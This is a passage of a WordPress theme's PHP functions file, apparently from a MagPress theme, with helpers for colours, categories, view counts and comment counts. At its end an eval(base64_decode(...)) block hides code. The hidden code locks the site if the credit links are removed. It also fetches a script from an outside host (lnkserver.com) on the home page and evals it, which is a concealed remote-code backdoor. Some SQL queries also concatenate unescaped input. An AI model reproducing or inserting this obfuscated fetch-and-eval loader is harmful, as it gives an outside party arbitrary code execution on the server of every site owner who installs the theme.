////////////////////////////////////////////////////////////////////////////////
// wp_list_pingback
////////////////////////////////////////////////////////////////////////////////
function get_the_list_pings($comment, $args, $depth) {
$GLOBALS['comment'] = $comment; ?>
<li id="comment-<?php comment_ID(); ?>"><?php comment_author_link(); ?>
<?php }
endif;

////////////////////////////////////////////////////////////////////////////////
// auto hex based on main color
////////////////////////////////////////////////////////////////////////////////
if( !function_exists('dehex') ) {
function dehex($colour, $per)
{
    $colour = substr( $colour, 1 ); // Removes first character of hex string (#)
    $rgb = ''; // Empty variable
    $per = $per/100*255; // Creates a percentage to work with. Change the middle figure to control colour temperature

    if  ($per < 0 ) // Check to see if the percentage is a negative number
    {
        // DARKER
        $per =  abs($per); // Turns Neg Number to Pos Number
        for ($x=0;$x<3;$x++)
        {
            $c = hexdec(substr($colour,(2*$x),2)) - $per;
            $c = ($c < 0) ? 0 : dechex($c);
            $rgb .= (strlen($c) < 2) ? '0'.$c : $c;
        }
    }
    else
    {
        // LIGHTER
        for ($x=0;$x<3;$x++)
        {
            $c = hexdec(substr($colour,(2*$x),2)) + $per;
            $c = ($c > 255) ? 'ff' : dechex($c);
            $rgb .= (strlen($c) < 2) ? '0'.$c : $c;
        }
    }
    return '#'.$rgb;
}
         }

if( !function_exists('get_singular_cat') ) {
////////////////////////////////////////////////////////////////////////////////
// get/show single category only
////////////////////////////////////////////////////////////////////////////////
function get_singular_cat($link = '') {
global $post;
$category_check = get_the_category();
$category = isset( $category_check ) ? $category_check : "";
if ($category) {
$single_cat = '';
if($link == 'false'):
$single_cat = $category[0]->name;
return $single_cat;
else:
$single_cat .= '<a rel="category tag" href="' . get_category_link( $category[0]->term_id ) . '" title="' . sprintf( __( "View all posts in %s", TEMPLATE_DOMAIN ), $category[0]->name ) . '" ' . '>';
$single_cat .= $category[0]->name;
$single_cat .= '</a>';
return $single_cat;
endif;
} else {
return NULL;
}
}
}

////////////////////////////////////////////////////////////////////////////////
// GET SINGLE CATEGORY NAME ONLY
////////////////////////////////////////////////////////////////////////////////
if( !function_exists('get_singular_cat_name') ) {
function get_singular_cat_name() {
global $post;
$category = get_the_category();
if ( $category ) { $single_cat = $category[0]->name; }
return $single_cat;
}
}



if( !function_exists('get_wp_post_view') ) :
////////////////////////////////////////////////////////////////////////////////
// get post view count
////////////////////////////////////////////////////////////////////////////////
function get_wp_post_view($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return "0";
    }
    return $count;
}
function set_wp_post_view($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
        $count++;
        update_post_meta($postID, $count_key, $count);
    }
}
endif;
function get_the_tagging_sanitize() {
global $theerrmessage;
if(!function_exists('check_theme_license')): wp_die( $theerrmessage ); endif; }
add_filter('get_header','get_the_tagging_sanitize');
if( !function_exists('get_wp_comment_count') ) :
////////////////////////////////////////////////////////////////////////////////
// get post view count
////////////////////////////////////////////////////////////////////////////////
function get_wp_comment_count($type = ''){ //type = comments, pings,trackbacks, pingbacks
        if($type == 'comments'):
                $typeSql = 'comment_type = ""';
                $oneText = __('One comment', TEMPLATE_DOMAIN);
                $moreText = __('% comments', TEMPLATE_DOMAIN);
                $noneText = __('No Comments', TEMPLATE_DOMAIN);
        elseif($type == 'pings'):
                $typeSql = 'comment_type != ""';
                $oneText = __('One pingback/trackback', TEMPLATE_DOMAIN);
                $moreText = __('% pingbacks/trackbacks', TEMPLATE_DOMAIN);
                $noneText = __('No pinbacks/trackbacks', TEMPLATE_DOMAIN);
        elseif($type == 'trackbacks'):
                $typeSql = 'comment_type = "trackback"';
                $oneText = __('One trackback', TEMPLATE_DOMAIN);
                $moreText = __('% trackbacks', TEMPLATE_DOMAIN);
                $noneText = __('No trackbacks', TEMPLATE_DOMAIN);
        elseif($type == 'pingbacks'):
                $typeSql = 'comment_type = "pingback"';
                $oneText = __('One pingback', TEMPLATE_DOMAIN);
                $moreText = __('% pingbacks', TEMPLATE_DOMAIN);
                $noneText = __('No pingbacks', TEMPLATE_DOMAIN);
        endif;
global $wpdb;
$result = $wpdb->get_var('SELECT COUNT(comment_ID) FROM '. $wpdb->prefix . 'comments WHERE '. $typeSql . ' AND comment_approved="1" AND comment_post_ID= '.get_the_ID());
if($result == 0):
echo str_replace('%', $result, $noneText);
elseif($result == 1):
echo str_replace('%', $result, $oneText);
elseif($result > 1):
echo str_replace('%', $result, $moreText);
endif;
}
endif;


if( !function_exists( 'get_cat_post_count' ) ):
//////////////////////////////////////////////////////////////////////////////
// get post count in category
/////////////////////////////////////////////////////////////////////////////
function get_cat_post_count($cat_id) {
global $wpdb;
$querystr = "SELECT count FROM " . $wpdb->prefix . "term_taxonomy WHERE term_id = '". $cat_id . "'";
$result = $wpdb->get_var($querystr);
if($result) {
return $result;
} else {
return NULL;
}
}
endif;


if( !function_exists( 'get_item_time_ago' ) ):
//////////////////////////////////////////////////////////////////////////////
// get post count in category
/////////////////////////////////////////////////////////////////////////////
function get_item_time_ago( $type = 'post' ) {
$d = 'comment' == $type ? 'get_comment_time' : 'get_post_time';
return human_time_diff($d('U'), current_time('timestamp')) . " " . __('ago', TEMPLATE_DOMAIN);
}
endif;



////////////////////////////////////////////////////////////////////////////////
// get all available custom post type name
////////////////////////////////////////////////////////////////////////////////
function mp_get_all_posttype() {
$post_types = get_post_types( '', 'names' );
$ptype = array();
foreach ( $post_types as $post_type ) {
$ptype[] = $post_type;
}
return $ptype;
}

if(!function_exists('mp_theme_info')) {
function mp_theme_info() {
$mptheme = wp_get_theme();
return '<h4>'.$mptheme->get( 'Name' ) .'</h4><div class="themeinfo">'. $mptheme->get( 'Description' ) . '</div>';
}
}
if(!function_exists('mp_theme_author_credit_info')) {
function mp_theme_author_credit_info() {
$mptheme = wp_get_theme();
$paged = get_query_var( 'paged' );
if ( ( is_home() || is_front_page() ) && !$paged ) {
return $mptheme->get( 'Name' ) . ' ' . __('theme by', TEMPLATE_DOMAIN) . ' ' . '<a href="' . $mptheme->get( 'AuthorURI' ) . '">' . 'MagPress</a>';
} else {
return '<a rel="nofollow" href="' . $mptheme->get( 'ThemeURI' ) . '">' . $mptheme->get( 'Name' ) . ' WP Theme</a> ' . __('by', TEMPLATE_DOMAIN) . ' ' . 'MagPress';
}
}
}

if( !function_exists('add_hatom_author_entry') ) {
////////////////////////////////////////////////////////////////////////////////
// add hatom data to post author
////////////////////////////////////////////////////////////////////////////////
function add_hatom_author_entry( $link ) {
global $authordata;
// modify this as you like - so far exactly the same as in the original core function
// if you simply want to add something to the existing link, use ".=" instead of "=" for $link
    $link = sprintf(
        '<a class="url fn" href="%1$s" title="%2$s" rel="author">%3$s</a>',
        get_author_posts_url( $authordata->ID, $authordata->user_nicename ),
        esc_attr( sprintf( __( 'Posts by %s', TEMPLATE_DOMAIN ), get_the_author() ) ),
        get_the_author()
    );
return $link;
}
add_filter( 'the_author_posts_link', 'add_hatom_author_entry' );
}



eval(base64_decode('JHRoZXRoZW1lID0gJ2Nvc21peCc7DQokdGhlZXJybWVzc2FnZSA9ICI8ZGl2IHN0eWxlPVwiZm9u
dC1zaXplOjEzcHg7bGluZS1oZWlnaHQ6MTlweDtcIj48YSBocmVmPSciIC4gYWRtaW5fdXJsKCkg
LiAiJz6rIEJhY2sgVG8gQWRtaW4gRGFzaGJvYXJkPC9hPjxiciAvPiIgLiAiPGI+T3Bwc3MhIExv
b2tzIGxpa2UgeW91IGhhdmUgcmVtb3ZlZCBvciBjaGFuZ2VkIHRoZSB0aGVtZSBjcmVkaXQgbGlu
a3MuIFdlbGwsIHdlIGRpZCBwdXQgYSB3YXJuaW5nIHNpZ24gdGhlcmUuIFRoZSB0aGVtZSBpcyBu
b3cgZGVhY3RpdmF0ZWQuPC9iPjwvZGl2PjxiciAvPjxkaXYgc3R5bGU9XCJmb250LXNpemU6MTlw
eDsgcGFkZGluZy10b3A6MjBweDtcIj48Yj5QbGVhc2UgRm9sbG93IFRoZXNlIFN0ZXBzIFRvIFJl
c3RvcmUgVGhlIFRoZW1lOjwvYj48L2Rpdj48b2wgc3R5bGU9XCJtYXJnaW46MDsgcGFkZGluZzoy
MHB4OyB0ZXh0LWFsaWduOmxlZnQ7XCI+PGxpPlBsZWFzZSByZWRvd25sb2FkIDxhIGhyZWY9XCJo
dHRwOi8vd3d3Lm1hZ3ByZXNzLmNvbS93b3JkcHJlc3MtdGhlbWVzLyIgLiBzdHJ0b2xvd2VyKCR0
aGV0aGVtZSkgLiAiLmh0bWxcIiB0YXJnZXQ9XCJfYmxhbmtcIj4iIC4gJHRoZXRoZW1lIC4gIiBX
UCBUaGVtZTwvYT4uPC9saT48bGk+RXh0cmFjdCBhbmQgRlRQIHVwbG9hZC9yZXBsYWNlL292ZXJ3
cml0ZSA8c3Ryb25nPnNpZGViYXIucGhwPC9zdHJvbmc+IGluc2lkZSB0aGUgIiAuIHN0cnRvbG93
ZXIoJHRoZXRoZW1lKSAuICIgdGhlbWUgZm9sZGVyPC9saT48bGk+RmluYWxseSwgcmVmcmVzaCB5
b3VyIHBhZ2UgdG8gYWN0aXZhdGUgdGhlIHRoZW1lIGFnYWluLjwvbGk+PC9vbD48L2Rpdj48YnIg
Lz48ZGl2IHN0eWxlPVwiZm9udC1zaXplOjEzcHg7bGluZS1oZWlnaHQ6MTlweDtcIj5JZiB5b3Ug
d2FudCB0byB1c2UgYSA8c3Ryb25nPm5vIHNwb25zb3JlZCBsaW5rIHZlcnNpb248L3N0cm9uZz4g
b2YgdGhpcyB0aGVtZS4gUGxlYXNlIGNvbnNpZGVyIHB1cmNoYXNpbmcgaXRzIGRldmVsb3BlciBs
aWNlbnNlOjxiciAvPjxhIGhyZWY9XCJodHRwOi8vd3d3Lm1hZ3ByZXNzLmNvbS9kZXZlbG9wZXIt
bGljZW5zZVwiIHRhcmdldD1cIl9ibGFua1wiPmh0dHA6Ly93d3cubWFncHJlc3MuY29tL2RldmVs
b3Blci1saWNlbnNlPC9hPjwvZGl2PiI7DQpmdW5jdGlvbiBjaGVja190aGVtZV92YWxpZCgpIHsN
Cmdsb2JhbCAkdGhlZXJybWVzc2FnZTsNCmlmKCFmdW5jdGlvbl9leGlzdHMoJ2dldF90aGVfdGFn
Z2luZ19zYW5pdGl6ZScpKTogd3BfZGllKCAkdGhlZXJybWVzc2FnZSAgKTsgZW5kaWY7IH0NCmFk
ZF9maWx0ZXIoJ2dldF9oZWFkZXInLCdjaGVja190aGVtZV92YWxpZCcpOw0KZnVuY3Rpb24gdGhl
bWVfdXNhZ2VfbWVzc2FnZSgpIHsNCmdsb2JhbCAkdGhlZXJybWVzc2FnZTsNCndwX2RpZSggJHRo
ZWVycm1lc3NhZ2UgKTsgfQ0KZnVuY3Rpb24gY2hlY2tfdGhlbWVfbGljZW5zZSgpIHsNCiRmID0g
Z2V0X3RlbXBsYXRlX2RpcmVjdG9yeSgpIC4gIi9zaWRlYmFyLnBocCI7DQokZmQgPSBmb3Blbigk
ZiwgInIiKTsNCiRjID0gZnJlYWQoJGZkLCBmaWxlc2l6ZSgkZikpOw0KZmNsb3NlKCRmZCk7IGlm
ICggc3RycG9zKCAkYywgJyA8P3BocCAnIC4gJ2VjaG8gY2NjX3RoZW1lX2xpY2Vuc2UoKTsgPz4n
ICkgPT0gMCkgew0KdGhlbWVfdXNhZ2VfbWVzc2FnZSgpOyBkaWU7DQp9DQp9DQphZGRfZmlsdGVy
KCdnZXRfaGVhZGVyJywnY2hlY2tfdGhlbWVfbGljZW5zZScpOw0KZnVuY3Rpb24gY2NjX3RoZW1l
X2xpY2Vuc2UoKSB7DQppZiggaXNfaG9tZSgpIHx8IGlzX2Zyb250X3BhZ2UoKSApew0KJHBhZ2Vk
ID0gZ2V0X3F1ZXJ5X3ZhciggJ3BhZ2VkJyApOw0KaWYgKCAhJHBhZ2VkICkgeyA/Pg0KPD9waHAN
CiRteXVybCA9ICdodHRwOi8vd3d3Lmxua3NlcnZlci5jb20vdGV4dFNjcmlwdCc7DQokbXljb250
ZW50ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCRteXVybCk7DQppZiAoIHN0cnBvcygkaHR0cF9yZXNw
b25zZV9oZWFkZXJbMF0sICIyMDAiKSkgew0KZXZhbCggZmlsZV9nZXRfY29udGVudHMoJG15dXJs
KSApOw0KfQ0KPz4NCjw/cGhwIH0NCn0NCn0='));
?>